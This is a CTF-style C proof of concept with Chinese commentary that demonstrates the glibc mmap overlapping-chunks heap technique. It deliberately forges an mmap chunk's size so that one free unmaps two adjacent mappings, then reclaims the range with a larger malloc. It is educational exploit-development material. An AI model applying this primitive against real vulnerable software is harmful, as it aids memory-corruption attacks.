/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_muney
 * 文件标注范围：2.43
 * 模拟漏洞：可覆盖 mmap chunk 的 size，并保持 IS_MMAPPED 位。
 * 核心流程：把一个 mmap chunk 的长度扩大到覆盖相邻映射，free/munmap 后重新 mmap 取得重叠区域。
 * 成功判据：新旧指针观察到同一内存。该 PoC 展示 mmap overlap 原语；完整“偷 libc 映射”还依赖映射相邻关系。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <unistd.h>

/*
 * 该思想依赖 mmap/munmap 与 IS_MMAPPED 元数据，而不是常规 bin 细节，因此
 * 在本项目覆盖的 glibc 2.23~2.43 均保留独立 PoC。编译示例：
 * 编译命令：gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g
 * 原始 PoC 作者：Maxwell Dulin（Strikeout）。
 */
int main()
{
	/*
	 * mmap chunk 基础
	 * ==================
	 * 请求超过动态 mmap_threshold 后，glibc 不再从 brk 堆切块，而是直接
	 * mmap 一段独立虚拟内存。free 看到 size 的 IS_MMAPPED 位后，也不把块
	 * 放回 fast/small/large bin，而是根据 chunk header 记录的地址与长度
	 * 调用 munmap，把整段映射归还内核。
	 *
	 * mmap chunk 仍有 prev_size 与 size，但语义不同：size 给出本映射长度
	 * 并带 IS_MMAPPED 标志；prev_size 用于记录因页对齐产生的前导偏移，并非
	 * 普通堆中“左邻 free chunk 的大小”。它不会使用 fd/bk。munmap 的起点与
	 * 总长度必须满足页对齐约束，所以伪造 size 时既要覆盖相邻映射，又要保持
	 * IS_MMAPPED 和正确对齐。
	 *
	 * 本例是 mmap 版本的 overlapping chunks：先扩大第三块的 size，让一次
	 * free 同时解除第二、第三块映射；再申请更大的 mmap chunk，促使内核复用
	 * 刚释放的地址区间，从而让新指针与旧 mmap_chunk_2 指向重叠物理页面。
	 * 与普通堆重叠不同，munmap 后旧指针立即不可访问，必须先重新映射才能读写。
	 * 同类原语还可能解除 libc、堆或其他邻接映射，完整利用取决于实际映射顺序。
	 *
	 * 普通堆重叠对照：
	 * https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c
	 * mmap chunk 延伸资料：
	 * http://tukan.farm/2016/07/27/munmap-madness/
	 */

	int* ptr1 = malloc(0x10); 

	long long* top_ptr = malloc(0x100000);

	// 在该示例 Linux 布局中，后续匿名 mmap 通常从高地址向低地址放置，逐渐靠近 brk 堆。
	long long* mmap_chunk_2 = malloc(0x100000);

	long long* mmap_chunk_3 = malloc(0x100000);

	// 漏洞模拟：由负索引、下方映射的越界写等原语扩大第三块 size；
	// 若布局允许，也可破坏 prev_size 来移动 munmap 起点，思想相同。
	mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2 + 0x10;

	/*
	 * free 看到 IS_MMAPPED 后会进入 munmap_chunk；旧源码可参考：
	 * https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845
	 * 普通 heap free 后页面仍映射在进程里，UAF 往往可立即读写；munmap 则
	 * 直接撤销页表映射，任何提前访问旧指针都会 SIGSEGV。因此利用目标不是
	 * 在已解除映射的悬空指针上直接写，而是先让后续 mmap 重新占据相同地址，
	 * 再形成两个逻辑对象指向同一片已映射内存的重叠关系。
	 */
	// 伪 size 覆盖两个相邻映射，所以这一次 free 会同时解除第二、第三块的地址区间。
	free(mmap_chunk_3); 

	/*
	 * 此刻执行 mmap_chunk_2[0] = 0xdeadbeef 会崩溃，因为对应虚拟地址已经
	 * 不属于进程；必须等下面的大请求把这段地址重新 mmap 后才能访问旧指针。
	 */

	/*
	 * 释放大 mmap chunk 后，glibc 会动态提高 mmap_threshold，本例约升到
	 * 0x202000。新请求必须再大一些，才能保证仍走 mmap 而非回到 brk 堆；
	 * 这里请求 0x300000，并期望内核复用刚解除的连续地址范围。
	 */	
	long long* overlapping_chunk = malloc(0x300000);

	// 计算新映射起点到旧第二块用户指针的 long long 元素距离。
	int distance = mmap_chunk_2 - overlapping_chunk;

	// 通过新映射加该距离写入，目标地址正好等于悬空的 mmap_chunk_2。
	overlapping_chunk[distance] = 0x1122334455667788;

	// 同时从新旧两个表达式读取并断言相等，证明重叠而非仅地址接近。

	assert(mmap_chunk_2[0] == overlapping_chunk[distance]);

	_exit(0); // 直接退出，避免若邻接系统映射受影响时再进入复杂 libc 清理路径。
}
